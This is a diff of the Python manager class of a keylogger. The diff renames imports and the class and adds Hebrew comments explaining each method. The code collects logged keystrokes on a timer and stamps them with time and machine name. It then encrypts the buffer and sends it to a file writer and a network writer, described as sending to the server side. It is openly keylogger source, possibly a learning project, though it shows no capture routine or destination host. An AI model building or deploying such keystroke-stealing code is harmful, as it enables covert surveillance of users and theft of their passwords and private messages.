@@ -1,14 +1,14 @@
 import threading
 from typing import List, Optional
 from datetime import datetime
-from interfaces.IkeyLogger import IKeyLogger
+from interfaces.IkeyLogger import Ikeylogger
 from interfaces.iwriter import IWriter
-from encryption import Encryptor
+from encryption.encryptor import Encryptor
 from config import Config
 
 
-class KeyLoggerManager:
-    def __init__(self, keylogger_service: IKeyLogger, file_writer: IWriter, network_writer: IWriter, encryptor: Encryptor):
+class KeyloggerManager:
+    def __init__(self, keylogger_service: Ikeylogger, file_writer: IWriter, network_writer: IWriter, encryptor: Encryptor):
         self.keylogger_service = keylogger_service
         self.file_writer = file_writer
         self.network_writer = network_writer
@@ -21,6 +21,7 @@ class KeyLoggerManager:
         self.machine_name = Config.MACHINE_NAME
         self.is_running_flag = False
 
+# פונקציה שמאתחלת את התוכנית 
     def start(self) -> None:
         if self.is_running_flag:
             print("KeyLoggerManager is already running")
@@ -30,6 +31,7 @@ class KeyLoggerManager:
         self._schedule_collection()
         print(f"KeyLoggerManager started with interval {self.update_interval}s")
 
+# פונקציה שמפסיקה את התוכנית
     def stop(self) -> None:
         if not self.is_running_flag:
             print("KeyLoggerManager is not running")
@@ -41,11 +43,13 @@ class KeyLoggerManager:
         self._collect_and_process()
         print("KeyLoggerManager stopped")
 
+# בודקת את הזמן
     def _schedule_collection(self) -> None:
         if self.is_running_flag:
             self.timer = threading.Timer(self.update_interval, self._collect_and_process)
             self.timer.start()
 
+# פונקציה שאוספת מידע
     def _collect_and_process(self) -> None:
         try:
             keys = self.keylogger_service.get_logged_keys()
@@ -59,6 +63,7 @@ class KeyLoggerManager:
             if self.is_running_flag:
                 self._schedule_collection()
 
+# פונקציה שמקבלת את המידע ומצפינה אותו
     def _process_buffer(self) -> None:
         try:
             with self.buffer_lock:
@@ -74,10 +79,12 @@ class KeyLoggerManager:
         except Exception as e:
             print(f"Error processing buffer: {e}")
 
+# פונקציה שמוסיפה זמן
     def _add_timestamp(self, data: str) -> str:
         timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
         return f"[{timestamp}] Machine: {self.machine_name}\n{data}\n{'='*50}\n"
 
+# פונקציה ששולחת לצד שרת
     def _send_to_writers(self, data: str) -> None:
         if self.file_writer:
             try:
@@ -90,13 +97,16 @@ class KeyLoggerManager:
             except Exception as e:
                 print(f"Error sending to network_writer: {e}")
 
+# פונקציה שבודקת אורך מידע
     def get_buffer_size(self) -> int:
         with self.buffer_lock:
             return len(self.buffer)
 
+# מעבדת מידע ומרוקנת את באפר
     def force_flush(self) -> None:
         self._process_buffer()
 
+# פונקציה שמעדכנת אם הזמן כל פעם שמשהו מתעדכן
     def update_interval_sec(self, new_interval: int) -> None:
         if new_interval <= 0:
             raise ValueError("Interval must be positive")
@@ -106,5 +116,6 @@ class KeyLoggerManager:
             self.timer.cancel()
             self._schedule_collection()
 
+# פונקציה שבודקת אם התוכנית פועלת
     def is_running(self) -> bool:
         return self.is_running_flag
